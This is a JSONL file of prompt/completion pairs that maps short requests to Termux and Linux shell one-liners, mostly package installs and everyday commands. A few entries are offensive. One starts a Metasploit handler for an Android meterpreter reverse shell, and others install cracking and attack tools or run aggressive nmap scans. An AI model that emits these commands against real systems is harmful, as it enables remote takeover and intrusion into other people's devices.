+{"prompt": "how do i install tshark on termux", "completion": "pkg install tshark -y"}
+{"prompt": "change default shell to bash", "completion": "chsh -s bash"}
+{"prompt": "check if file exists script", "completion": "[ -f file.txt ] && echo exists || echo missing"}
+{"prompt": "create and push git repo", "completion": "git init && git add . && git commit -m 'init' && git remote add origin https://github.com/user/repo.git && git push -u origin main"}
+{"prompt": "copy from downloads", "completion": "cp ~/storage/downloads/file.txt ."}
+{"prompt": "how to install rust", "completion": "pkg install rust -y"}
+{"prompt": "convert image format", "completion": "convert image.png image.jpg"}
+{"prompt": "merge branch", "completion": "git merge feature/new-feature"}
+{"prompt": "what is my ip address termux", "completion": "ip addr show wlan0 | grep inet"}
+{"prompt": "list all users termux", "completion": "cat /etc/passwd"}
+{"prompt": "termux install clang", "completion": "pkg install clang -y"}
+{"prompt": "need ruby in termux", "completion": "pkg install ruby -y"}
+{"prompt": "get make on termux", "completion": "pkg install make -y"}
+{"prompt": "aircrack-ng command not found termux", "completion": "pkg install aircrack-ng -y"}
+{"prompt": "get redis key", "completion": "redis-cli get mykey"}
+{"prompt": "list tmux sessions", "completion": "tmux ls"}
+{"prompt": "check python version", "completion": "python --version"}
+{"prompt": "termux install apache2", "completion": "pkg install apache2 -y"}
+{"prompt": "check outdated packages", "completion": "npm outdated"}
+{"prompt": "commit changes", "completion": "git commit -m 'initial commit'"}
+{"prompt": "extract zip file", "completion": "unzip archive.zip"}
+{"prompt": "setup vim termux", "completion": "pkg install vim -y"}
+{"prompt": "start tmux", "completion": "tmux"}
+{"prompt": "enable clipboard in termux ssh", "completion": "export DISPLAY=:0"}
+{"prompt": "install python create venv install requests", "completion": "pkg install python -y && python -m venv env && source env/bin/activate && pip install requests"}
+{"prompt": "reload zshrc", "completion": "source ~/.zshrc"}
+{"prompt": "nodejs command not found termux", "completion": "pkg install nodejs -y"}
+{"prompt": "install termux-boot", "completion": "pkg install termux-boot -y"}
+{"prompt": "show last commit", "completion": "git log -1"}
+{"prompt": "termux how to get wget", "completion": "pkg install wget -y"}
+{"prompt": "login as root ubuntu", "completion": "proot-distro login ubuntu --user root"}
+{"prompt": "tr lowercase to uppercase", "completion": "echo hello | tr a-z A-Z"}
+{"prompt": "fingerprint auth", "completion": "termux-fingerprint"}
+{"prompt": "run with proxychains", "completion": "proxychains curl https://example.com"}
+{"prompt": "can i install python in termux", "completion": "pkg install python -y"}
+{"prompt": "i want to use openssh in termux", "completion": "pkg install openssh -y"}
+{"prompt": "upgrade termux", "completion": "pkg update -y && pkg upgrade -y"}
+{"prompt": "need curl in termux", "completion": "pkg install curl -y"}
+{"prompt": "set environment variable", "completion": "export MY_VAR='hello'"}
+{"prompt": "need htop in termux", "completion": "pkg install htop -y"}
+{"prompt": "cancel job", "completion": "termux-job-scheduler --cancel --job-id 1"}
+{"prompt": "curl command not found termux", "completion": "pkg install curl -y"}
+{"prompt": "fix npm audit issues", "completion": "npm audit fix"}
+{"prompt": "split tmux pane vertical", "completion": "tmux split-window -v"}
+{"prompt": "how to save and exit vim", "completion": ":wq"}
+{"prompt": "install mariadb", "completion": "pkg install mariadb -y"}
+{"prompt": "run sqlite command", "completion": "sqlite3 mydb.db 'SELECT * FROM users;'"}
+{"prompt": "search for python package", "completion": "pkg search python"}
+{"prompt": "install lua in termux", "completion": "pkg install lua -y"}
+{"prompt": "setup ffmpeg termux", "completion": "pkg install ffmpeg -y"}
+{"prompt": "init rust project", "completion": "cargo new myproject"}
+{"prompt": "can i install ruby in termux", "completion": "pkg install ruby -y"}
+{"prompt": "show git config", "completion": "git config --list"}
+{"prompt": "can i install nmap in termux", "completion": "pkg install nmap -y"}
+{"prompt": "can i install ripgrep in termux", "completion": "pkg install ripgrep -y"}
+{"prompt": "how to install git", "completion": "pkg install git -y"}
+{"prompt": "how to install ruby", "completion": "pkg install ruby -y"}
+{"prompt": "install metasploit", "completion": "pkg install metasploit -y"}
+{"prompt": "sort file contents", "completion": "sort file.txt"}
+{"prompt": "run python script", "completion": "python script.py"}
+{"prompt": "volume up", "completion": "termux-volume music 15"}
+{"prompt": "python not found termux", "completion": "pkg install python -y"}
+{"prompt": "install mediainfo", "completion": "pkg install mediainfo -y"}
+{"prompt": "truncate file", "completion": "truncate -s 0 file.txt"}
+{"prompt": "replace in string", "completion": "echo ${mystring/old/new}"}
+{"prompt": "install termux api", "completion": "pkg install termux-api -y"}
+{"prompt": "list files with details", "completion": "ls -la"}
+{"prompt": "compress image", "completion": "convert image.jpg -quality 80 compressed.jpg"}
+{"prompt": "show sha256 hash", "completion": "sha256sum file.txt"}
+{"prompt": "termux install nginx", "completion": "pkg install nginx -y"}
+{"prompt": "termux how to get screen", "completion": "pkg install screen -y"}
+{"prompt": "install youtube-dl", "completion": "pip install yt-dlp"}
+{"prompt": "install zsh in termux", "completion": "pkg install zsh -y"}
+{"prompt": "install make package termux", "completion": "pkg install make -y"}
+{"prompt": "bring background process to foreground", "completion": "fg"}
+{"prompt": "install wget in termux", "completion": "pkg install wget -y"}
+{"prompt": "remove all cron jobs", "completion": "crontab -r"}
+{"prompt": "install proxychains package termux", "completion": "pkg install proxychains-ng -y"}
+{"prompt": "need vim in termux", "completion": "pkg install vim -y"}
+{"prompt": "backup termux home to sdcard", "completion": "tar -czf ~/storage/downloads/termux-backup-$(date +%Y%m%d).tar.gz -C $HOME ."}
+{"prompt": "list all branches", "completion": "git branch -a"}
+{"prompt": "get wget on termux", "completion": "pkg install wget -y"}
+{"prompt": "share file from termux", "completion": "termux-share file.txt"}
+{"prompt": "append to file", "completion": "echo 'new line' >> file.txt"}
+{"prompt": "how do i install openssh on termux", "completion": "pkg install openssh -y"}
+{"prompt": "scan and list open ports on device", "completion": "nmap -sV localhost"}
+{"prompt": "freeze requirements", "completion": "pip freeze > requirements.txt"}
+{"prompt": "how do i install ripgrep on termux", "completion": "pkg install ripgrep -y"}
+{"prompt": "termux how to get aircrack-ng", "completion": "pkg install aircrack-ng -y"}
+{"prompt": "upgrade pip", "completion": "pip install --upgrade pip"}
+{"prompt": "install selenium", "completion": "pip install selenium"}
+{"prompt": "ssh with verbose debug", "completion": "ssh -v user@server.com"}
+{"prompt": "how to install gcc", "completion": "pkg install gcc -y"}
+{"prompt": "sed print specific line", "completion": "sed -n '5p' file.txt"}
+{"prompt": "setup redis termux", "completion": "pkg install redis -y"}
+{"prompt": "how to install tmux", "completion": "pkg install tmux -y"}
+{"prompt": "watch command every 2 seconds", "completion": "watch -n 2 ls -la"}
+{"prompt": "clone and run python project", "completion": "git clone https://github.com/user/repo.git && cd repo && pip install -r requirements.txt && python main.py"}
+{"prompt": "install mypy", "completion": "pip install mypy"}
+{"prompt": "how do i install sqlmap on termux", "completion": "pkg install sqlmap -y"}
+{"prompt": "install aria2", "completion": "pkg install aria2 -y"}
+{"prompt": "termux install htop", "completion": "pkg install htop -y"}
+{"prompt": "reinstall git", "completion": "pkg reinstall git -y"}
+{"prompt": "ping google", "completion": "ping -c 4 google.com"}
+{"prompt": "start screen", "completion": "screen"}
+{"prompt": "check http response", "completion": "curl -I https://google.com"}
+{"prompt": "need netcat in termux", "completion": "pkg install netcat -y"}
+{"prompt": "expect timeout script", "completion": "expect -c \"spawn ssh user@host; expect password; send mypassword\\r; interact\""}
+{"prompt": "scan website nikto", "completion": "nikto -h https://example.com"}
+{"prompt": "start http server", "completion": "python -m http.server 8080"}
+{"prompt": "kill process by pid", "completion": "kill 1234"}
+{"prompt": "install paramiko", "completion": "pip install paramiko"}
+{"prompt": "clang command not found termux", "completion": "pkg install clang -y"}
+{"prompt": "need bat in termux", "completion": "pkg install bat -y"}
+{"prompt": "show background jobs", "completion": "jobs"}
+{"prompt": "show confirm dialog", "completion": "termux-dialog confirm -t 'Are you sure?'"}
+{"prompt": "termux how to get gcc", "completion": "pkg install gcc -y"}
+{"prompt": "show last 10 lines of file", "completion": "tail file.txt"}
+{"prompt": "show disk usage ncdu", "completion": "pkg install ncdu -y && ncdu"}
+{"prompt": "connect to server", "completion": "ssh user@192.168.1.1"}
+{"prompt": "run jupyter notebook", "completion": "jupyter notebook --ip=0.0.0.0"}
+{"prompt": "install cmake termux", "completion": "pkg install cmake -y"}
+{"prompt": "install hydra package termux", "completion": "pkg install hydra -y"}
+{"prompt": "force reinstall git", "completion": "pkg reinstall git -y"}
+{"prompt": "install aircrack-ng package termux", "completion": "pkg install aircrack-ng -y"}
+{"prompt": "install screen package termux", "completion": "pkg install screen -y"}
+{"prompt": "upgrade all packages", "completion": "pkg update -y && pkg upgrade -y"}
+{"prompt": "update all packages", "completion": "pkg update -y"}
+{"prompt": "generate uuid", "completion": "cat /proc/sys/kernel/random/uuid"}
+{"prompt": "gcc command not found termux", "completion": "pkg install gcc -y"}
+{"prompt": "where are packages installed termux", "completion": "echo $PREFIX/bin"}
+{"prompt": "install mariadb in termux", "completion": "pkg install mariadb -y"}
+{"prompt": "termux install git", "completion": "pkg install git -y"}
+{"prompt": "termux home directory", "completion": "echo $HOME"}
+{"prompt": "how do i install nmap on termux", "completion": "pkg install nmap -y"}
+{"prompt": "need tmux in termux", "completion": "pkg install tmux -y"}
+{"prompt": "install go packages", "completion": "go install github.com/user/tool@latest"}
+{"prompt": "git command not found termux", "completion": "pkg install git -y"}
+{"prompt": "check cpu info", "completion": "cat /proc/cpuinfo"}
+{"prompt": "squash last 3 commits", "completion": "git rebase -i HEAD~3"}
+{"prompt": "get nano on termux", "completion": "pkg install nano -y"}
+{"prompt": "how do i install hydra on termux", "completion": "pkg install hydra -y"}
+{"prompt": "move file a.txt to downloads", "completion": "mv a.txt ~/storage/downloads/"}
+{"prompt": "deactivate virtual environment", "completion": "deactivate"}
+{"prompt": "tor command not found termux", "completion": "pkg install tor -y"}
+{"prompt": "need socat in termux", "completion": "pkg install socat -y"}
+{"prompt": "termux install mariadb", "completion": "pkg install mariadb -y"}
+{"prompt": "sleep 5 seconds", "completion": "sleep 5"}
+{"prompt": "show system calls process", "completion": "strace python script.py"}
+{"prompt": "base64 decode string", "completion": "echo 'aGVsbG8=' | base64 -d"}
+{"prompt": "show package info", "completion": "pkg show curl"}
+{"prompt": "loop over array", "completion": "for i in a b c; do echo $i; done"}
+{"prompt": "flush dns cache", "completion": "pkill -HUP dnsmasq"}
+{"prompt": "can i install proxychains in termux", "completion": "pkg install proxychains-ng -y"}
+{"prompt": "split large file", "completion": "split -b 50M bigfile.txt chunk"}
+{"prompt": "find files larger than 100mb", "completion": "find . -size +100M"}
+{"prompt": "replace text in file", "completion": "sed -i 's/old/new/g' file.txt"}
+{"prompt": "new tmux window", "completion": "tmux new-window"}
+{"prompt": "install cowsay", "completion": "pkg install cowsay -y"}
+{"prompt": "install sqlite package termux", "completion": "pkg install sqlite -y"}
+{"prompt": "need nikto in termux", "completion": "pkg install nikto -y"}
+{"prompt": "cherry pick commit", "completion": "git cherry-pick abc1234"}
+{"prompt": "create zip archive", "completion": "zip -r archive.zip myfolder/"}
+{"prompt": "termux how to get hydra", "completion": "pkg install hydra -y"}
+{"prompt": "install jupyterlab", "completion": "pip install jupyterlab"}
+{"prompt": "install fzf package termux", "completion": "pkg install fzf -y"}
+{"prompt": "install htop package termux", "completion": "pkg install htop -y"}
+{"prompt": "fix broken packages", "completion": "dpkg --configure -a && apt-get install -f"}
+{"prompt": "setup tmux termux", "completion": "pkg install tmux -y"}
+{"prompt": "tee output to file", "completion": "command | tee output.txt"}
+{"prompt": "sed insert line after match", "completion": "sed '/pattern/a\\new line' file.txt"}
+{"prompt": "trace route", "completion": "traceroute google.com"}
+{"prompt": "check arp table", "completion": "arp -a"}
+{"prompt": "run speedtest", "completion": "speedtest-cli"}
+{"prompt": "ffmpeg command not found termux", "completion": "pkg install ffmpeg -y"}
+{"prompt": "termux install openssh", "completion": "pkg install openssh -y"}
+{"prompt": "install htop in termux", "completion": "pkg install htop -y"}
+{"prompt": "generate random password", "completion": "openssl rand -base64 16"}
+{"prompt": "install fzf", "completion": "pkg install fzf -y"}
+{"prompt": "termux install cmake", "completion": "pkg install cmake -y"}
+{"prompt": "compress with xz", "completion": "xz file.txt"}
+{"prompt": "create folder in downloads", "completion": "mkdir ~/storage/downloads/myproject"}
+{"prompt": "need nano in termux", "completion": "pkg install nano -y"}
+{"prompt": "clean build files", "completion": "make clean"}
+{"prompt": "termux install ruby", "completion": "pkg install ruby -y"}
+{"prompt": "how do i install rust on termux", "completion": "pkg install rust -y"}
+{"prompt": "install tmux in termux", "completion": "pkg install tmux -y"}
+{"prompt": "neovim command not found termux", "completion": "pkg install neovim -y"}
+{"prompt": "i want to use nmap in termux", "completion": "pkg install nmap -y"}
+{"prompt": "show last 20 lines", "completion": "tail -n 20 file.txt"}
+{"prompt": "termux no space left", "completion": "pkg clean && rm -rf ~/.cache"}
+{"prompt": "can i install rust in termux", "completion": "pkg install rust -y"}
+{"prompt": "change ssh port", "completion": "sed -i 's/#Port 22/Port 8022/' $PREFIX/etc/ssh/sshd_config"}
+{"prompt": "can i install aircrack-ng in termux", "completion": "pkg install aircrack-ng -y"}
+{"prompt": "xargs example", "completion": "ls *.txt | xargs rm"}
+{"prompt": "push tags", "completion": "git push --tags"}
+{"prompt": "termux how to get openssh", "completion": "pkg install openssh -y"}
+{"prompt": "install uvicorn", "completion": "pip install uvicorn"}
+{"prompt": "install numpy", "completion": "pip install numpy"}
+{"prompt": "install sqlmap package termux", "completion": "pkg install sqlmap -y"}
+{"prompt": "show remotes", "completion": "git remote -v"}
+{"prompt": "i want to use php in termux", "completion": "pkg install php -y"}
+{"prompt": "show staged diff", "completion": "git diff --staged"}
+{"prompt": "setup ssh and start", "completion": "pkg install openssh -y && ssh-keygen -t rsa -b 4096 -N '' -f ~/.ssh/id_rsa && sshd"}
+{"prompt": "parallel download aria2", "completion": "aria2c -x 16 https://example.com/file.zip"}
+{"prompt": "show system info neofetch", "completion": "pkg install neofetch -y && neofetch"}
+{"prompt": "create new branch", "completion": "git checkout -b feature/new-feature"}
+{"prompt": "convert video", "completion": "ffmpeg -i input.mp4 output.avi"}
+{"prompt": "i want to use clang in termux", "completion": "pkg install clang -y"}
+{"prompt": "ssh tunnel socks proxy", "completion": "ssh -D 1080 user@server.com"}
+{"prompt": "can i install clang in termux", "completion": "pkg install clang -y"}
+{"prompt": "i want to use perl in termux", "completion": "pkg install perl -y"}
+{"prompt": "need make in termux", "completion": "pkg install make -y"}
+{"prompt": "purge python termux", "completion": "pkg uninstall python -y"}
+{"prompt": "hydra command not found termux", "completion": "pkg install hydra -y"}
+{"prompt": "can i install aria2 in termux", "completion": "pkg install aria2 -y"}
+{"prompt": "open file", "completion": "termux-open file.pdf"}
+{"prompt": "i want to use curl in termux", "completion": "pkg install curl -y"}
+{"prompt": "free space remove old packages", "completion": "pkg clean"}
+{"prompt": "install lodash", "completion": "npm install lodash"}
+{"prompt": "install fedora", "completion": "proot-distro install fedora"}
+{"prompt": "set brightness", "completion": "termux-brightness 128"}
+{"prompt": "add sqlite package termux", "completion": "pkg install sqlite -y"}
+{"prompt": "find all python files", "completion": "find . -name '*.py'"}
+{"prompt": "need openssh in termux", "completion": "pkg install openssh -y"}
+{"prompt": "install clang in termux", "completion": "pkg install clang -y"}
+{"prompt": "install packages in alpine", "completion": "proot-distro login alpine -- apk update && apk add python3"}
+{"prompt": "termux install php", "completion": "pkg install php -y"}
+{"prompt": "need tree in termux", "completion": "pkg install tree -y"}
+{"prompt": "install python in termux", "completion": "pkg install python -y"}
+{"prompt": "update and upgrade termux", "completion": "pkg update -y && pkg upgrade -y"}
+{"prompt": "get ffmpeg on termux", "completion": "pkg install ffmpeg -y"}
+{"prompt": "install opencv", "completion": "pip install opencv-python"}
+{"prompt": "set upstream branch", "completion": "git push -u origin main"}
+{"prompt": "termux how to get zsh", "completion": "pkg install zsh -y"}
+{"prompt": "compile with clang", "completion": "clang main.c -o main"}
+{"prompt": "show make targets", "completion": "make help"}
+{"prompt": "can i install mariadb in termux", "completion": "pkg install mariadb -y"}
+{"prompt": "clear terminal", "completion": "clear"}
+{"prompt": "need mariadb in termux", "completion": "pkg install mariadb -y"}
+{"prompt": "start listener metasploit", "completion": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'"}
+{"prompt": "install nmap package termux", "completion": "pkg install nmap -y"}
+{"prompt": "initialize git repo", "completion": "git init"}
+{"prompt": "monitor network traffic", "completion": "tcpdump -i wlan0"}
+{"prompt": "open url in browser", "completion": "termux-open-url https://google.com"}
+{"prompt": "setup php server with composer", "completion": "pkg install php -y && curl -sS https://getcomposer.org/installer | php && php -S 0.0.0.0:8080"}
+{"prompt": "show disk usage", "completion": "df -h"}
+{"prompt": "bat command not found termux", "completion": "pkg install bat -y"}
+{"prompt": "aggressive scan", "completion": "nmap -A 192.168.1.1"}
+{"prompt": "how do i install wget on termux", "completion": "pkg install wget -y"}
+{"prompt": "go to downloads", "completion": "cd ~/storage/downloads"}
+{"prompt": "create folder named projects", "completion": "mkdir projects"}
+{"prompt": "os detection scan", "completion": "nmap -O 192.168.1.1"}
+{"prompt": "download youtube audio only", "completion": "yt-dlp -x --audio-format mp3 https://youtube.com/watch?v=VIDEO_ID"}
+{"prompt": "install rust crates", "completion": "cargo install ripgrep"}
+{"prompt": "open neovim", "completion": "nvim"}
+{"prompt": "how do i install cmake on termux", "completion": "pkg install cmake -y"}
+{"prompt": "termux how to get tmux", "completion": "pkg install tmux -y"}
+{"prompt": "setup lua termux", "completion": "pkg install lua -y"}
+{"prompt": "need bun in termux", "completion": "pkg install bun -y"}
+{"prompt": "start tor", "completion": "tor &"}
+{"prompt": "termux how to get nodejs", "completion": "pkg install nodejs -y"}
+{"prompt": "go to shared storage", "completion": "cd ~/storage/shared"}
+{"prompt": "kill process on port 8080", "completion": "kill $(lsof -t -i:8080)"}
+{"prompt": "termux install perl", "completion": "pkg install perl -y"}
+{"prompt": "set cron job", "completion": "crontab -e"}
+{"prompt": "can i install tree in termux", "completion": "pkg install tree -y"}
+{"prompt": "install john", "completion": "pkg install john -y"}
+{"prompt": "i want to use tmux in termux", "completion": "pkg install tmux -y"}
+{"prompt": "setup storage access", "completion": "termux-setup-storage"}
+{"prompt": "install and configure neovim", "completion": "pkg install neovim -y && mkdir -p ~/.config/nvim && touch ~/.config/nvim/init.vim"}
+{"prompt": "install matplotlib", "completion": "pip install matplotlib"}
+{"prompt": "curl ssl error termux", "completion": "pkg install ca-certificates -y"}
+{"prompt": "dpkg configure", "completion": "dpkg --configure -a && apt-get install -f"}
+{"prompt": "list screen sessions", "completion": "screen -ls"}
+{"prompt": "check open files", "completion": "lsof"}
+{"prompt": "golang command not found termux", "completion": "pkg install golang -y"}
+{"prompt": "install figlet", "completion": "pkg install figlet -y"}
+{"prompt": "install redis in termux", "completion": "pkg install redis -y"}
+{"prompt": "how do i install nodejs on termux", "completion": "pkg install nodejs -y"}
+{"prompt": "start mongodb", "completion": "mongod --dbpath ~/mongodb &"}
+{"prompt": "reload bashrc", "completion": "source ~/.bashrc"}
+{"prompt": "rust command not found termux", "completion": "pkg install rust -y"}
+{"prompt": "install golang and run hello world", "completion": "pkg install golang -y && echo 'package main\\nimport \"fmt\"\\nfunc main(){fmt.Println(\"Hello\")}' > main.go && go run main.go"}
+{"prompt": "install yarn", "completion": "npm install -g yarn"}
+{"prompt": "go to dcim folder", "completion": "cd ~/storage/dcim"}
+{"prompt": "need aircrack-ng in termux", "completion": "pkg install aircrack-ng -y"}
+{"prompt": "check exit code", "completion": "echo $?"}
+{"prompt": "i want to use nano in termux", "completion": "pkg install nano -y"}
+{"prompt": "setup postgresql termux", "completion": "pkg install postgresql -y"}
+{"prompt": "add postgresql package termux", "completion": "pkg install postgresql -y"}
+{"prompt": "add remote origin", "completion": "git remote add origin https://github.com/user/repo.git"}
+{"prompt": "create tar archive", "completion": "tar -czf archive.tar.gz myfolder/"}
+{"prompt": "termux how to get mariadb", "completion": "pkg install mariadb -y"}
+{"prompt": "termux install lua", "completion": "pkg install lua -y"}
+{"prompt": "compress with gzip", "completion": "gzip file.txt"}
+{"prompt": "discard output", "completion": "command > /dev/null 2>&1"}
+{"prompt": "how to install openssh", "completion": "pkg install openssh -y"}
+{"prompt": "install sequelize", "completion": "npm install sequelize"}
+{"prompt": "termux install vim", "completion": "pkg install vim -y"}
+{"prompt": "view large file page by page", "completion": "less file.txt"}
+{"prompt": "create nested folders a/b/c", "completion": "mkdir -p a/b/c"}
+{"prompt": "run gui app termux", "completion": "termux-x11 :1 &"}
+{"prompt": "install vue cli", "completion": "npm install -g @vue/cli"}
+{"prompt": "get php on termux", "completion": "pkg install php -y"}
+{"prompt": "copy ssh key to server", "completion": "ssh-copy-id user@192.168.1.1"}
+{"prompt": "how do i install php on termux", "completion": "pkg install php -y"}
+{"prompt": "setup python termux", "completion": "pkg install python -y"}
+{"prompt": "setup rust termux", "completion": "pkg install rust -y"}
+{"prompt": "install mariadb init and start", "completion": "pkg install mariadb -y && mysql_install_db && mysqld_safe &"}
+{"prompt": "init postgresql", "completion": "initdb $PREFIX/var/lib/postgresql"}
+{"prompt": "install bun package termux", "completion": "pkg install bun -y"}
+{"prompt": "run compiled binary", "completion": "./main"}
+{"prompt": "set file immutable", "completion": "chattr +i file.txt"}
+{"prompt": "get nodejs on termux", "completion": "pkg install nodejs -y"}
+{"prompt": "follow log file live", "completion": "tail -f logfile.txt"}
+{"prompt": "list files with exa", "completion": "exa -la"}
+{"prompt": "nikto command not found termux", "completion": "pkg install nikto -y"}
+{"prompt": "take photo with front camera", "completion": "termux-camera-photo -c 1 selfie.jpg"}
+{"prompt": "list downloads", "completion": "ls ~/storage/downloads/"}
+{"prompt": "download entire website", "completion": "wget --mirror https://example.com"}
+{"prompt": "login to ubuntu", "completion": "proot-distro login ubuntu"}
+{"prompt": "need ripgrep in termux", "completion": "pkg install ripgrep -y"}
+{"prompt": "show os info", "completion": "cat /etc/os-release"}
+{"prompt": "yes command auto confirm", "completion": "yes | command"}
+{"prompt": "install pytorch", "completion": "pip install torch"}
+{"prompt": "print rainbow text", "completion": "echo -e '\\033[1;31mR\\033[1;33mA\\033[1;32mI\\033[1;36mN\\033[1;34mB\\033[1;35mO\\033[1;31mW\\033[0m'"}
+{"prompt": "check git status", "completion": "git status"}
+{"prompt": "how do i install tree on termux", "completion": "pkg install tree -y"}
+{"prompt": "i want to use vim in termux", "completion": "pkg install vim -y"}
+{"prompt": "need neovim in termux", "completion": "pkg install neovim -y"}
+{"prompt": "show pip package info", "completion": "pip show requests"}
+{"prompt": "restart ssh termux", "completion": "pkill sshd; sshd"}
+{"prompt": "i want to use postgresql in termux", "completion": "pkg install postgresql -y"}
+{"prompt": "setup wget termux", "completion": "pkg install wget -y"}
+{"prompt": "show dialog", "completion": "termux-dialog text -t 'Enter name'"}
